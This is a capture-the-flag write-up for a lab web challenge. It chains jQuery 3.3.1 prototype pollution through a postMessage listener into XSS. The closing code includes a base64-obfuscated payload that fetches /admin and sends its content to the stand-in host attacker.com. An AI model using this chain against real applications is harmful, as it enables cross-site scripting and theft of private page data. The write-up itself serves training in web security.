# MessageMe

## Challenge

>   Your friend has created a new blog, but weird things are happening ... go and see what's going on! 
>   What you know: before clicking on your link, the bot is connected to the application at http://127.0.0.1:3000
>
>   Author : `Elweth` 

- Catégorie: Web
- Difficulté: Medium

## Deployment

- Docker compose

```bash
cd src; docker compose up
``` 

## Writeup


### PostMessage 

The application is quite small, there is a file /assets/script.js which is loaded :

```javascript
window.addEventListener('message', (event) => {
    const defaultData = { "date": Date(), "title": "Sample", "message": "No message provided" };
    const json = $.extend(true, {}, defaultData, JSON.parse(event.data));
    
    const text = `Date: ${json.date}\nTitle: ${json.title}\nMessage: ${json.message}`;
    document.getElementById('messageDisplay').innerText = text
    
    if(defaultData.urgentMessage)
    {
        content = document.getElementById('messageDisplay')
        content.innerHTML += "<p class='urgent'>" + urgentMessage + "</p>";
    }
});
```

The application listens to an EventListener of type "message" to dynamically add content to the page.

We can communicate with this EventListener through a postMessage mechanism :

![postmessage1](/images/postmessage1.png)

The content is rendered with `innerText` so no XSS possible.

Only the "urgentMessage" is rendered through innerHTML but it seems we can't control it.

### Jquery Prototype pollution

The application is loading Jquery v3.3.1 :

```html
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
```

The version is vulnerable to prototype pollution with the use of `$.extend` to merge 2 JSON.

- https://www.exploit-db.com/exploits/52141

We can confirme the prototype pollution with the following example allowing to create attributes in `Object.prototype` : 

```javascript
const original = {"foo": "bar"}
const evil = JSON.parse('{"__proto__": {"polluted": "pouetpouet"}}')
const json = $.extend(true, {}, original, evil);
window.polluted
'pouetpouet'
```

![polluted](/images/polluted_poc.png)

Thanks to this primitive we can forge a postMessage to trigger the prototype pollution, to create a `urgentMessage` and trigger the XSS : 

![trigger_pp_xss](/images/trigger_pp_xss.png)

To get the flag, you have to exploit the XSS to exfiltrate the content of the /admin. This can be done as is :

```javascript
fetch("/admin").then(d => d.text()).then((data) => {
    flag = data;
    window.location.href = `http://attacker.com/?cookie=${btoa(flag)}`;
})
```

To trigger the postMessge, host the page and send it to the bot:

```html
<script>
    x = open("http://127.0.0.1:3000/");

    setTimeout(() => {
      x.postMessage(
        '{"date": "123", "title":"456", "message": "789", "__proto__": {"urgentMessage": "<img src=x onerror=eval(atob(\'ZmV0Y2goIi9hZG1pbiIpLnRoZW4oZCA9PiBkLnRleHQoKSkudGhlbigoZGF0YSkgPT4geyBmbGFnID0gZGF0YTsgd2luZG93LmxvY2F0aW9uLmhyZWYgPSBgaHR0cDovLy9hdHRhY2tlci5jb20vLj9jb29raWU9JHtidG9hKGZsYWcpfWA7IH0p\'))>"}}',
        "*"
      );
    }, 5000);
</script>
```